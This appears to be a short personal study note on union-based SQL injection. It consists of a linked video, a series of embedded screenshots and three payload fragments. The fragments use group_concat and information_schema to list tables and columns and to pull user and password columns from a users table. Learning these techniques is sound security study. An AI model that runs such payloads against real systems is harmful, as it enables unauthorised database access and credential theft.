[[SQL-Injection]]
[Youtube](https://www.youtube.com/watch?v=TlTMDw1KD_8&feature=emb_logo)

# Union Based SQLi
1. ![[Pasted image 20201210003338.png]]
2. ![[Pasted image 20201210003752.png]]
3. ![[Pasted image 20201210003703.png]]
4. ![[Pasted image 20201210003926.png]]
5. ![[Pasted image 20201210004056.png]]
6. ![[Pasted image 20201210023745.png]]![[Pasted image 20201210023846.png]]
7. Basic info column ![[Pasted image 20201210024122.png]]![[Pasted image 20201210024222.png]]
8. Some other payloads
	1. show all tables `group_concat(table_name,0x0a) from information_schema.tables where table_schema=database()`
	2.  show all columns (update users to the table you are using if it is not called users)`group_concat(column_name,0x0a) from information_schema.columns where table_name='users'`
	3.  show column data (user and password are the column names and users is the table name)`group_concat(user, 0x0a, password) from users`